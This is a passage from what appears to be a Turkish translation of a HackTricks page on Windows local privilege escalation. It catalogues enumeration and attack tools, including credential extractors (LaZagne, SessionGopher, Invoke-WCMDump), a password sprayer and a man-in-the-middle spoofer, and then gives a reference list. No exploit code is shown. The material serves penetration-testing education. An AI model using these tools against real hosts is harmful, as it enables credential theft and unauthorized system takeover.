[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş session bilgilerini çıkarır. Local’de -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager’dan crendentials çıkarır. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan passwords’leri domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle tool’udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerabilities’larını arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights gerekli)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerabilities’larını arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak host’u enumerate eder (privesc’ten çok bir bilgi toplama tool’u) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok software’den credentials çıkarır (github’da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp’ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github’da executable precompiled). Tavsiye edilmez. Win10’da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python’dan exe). Tavsiye edilmez. Win10’da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post’a dayanarak oluşturulan tool (doğru çalışması için accesschk gerektirmez ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploits önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploits önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi .NET’in doğru sürümünü kullanarak compile etmeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host üzerindeki yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
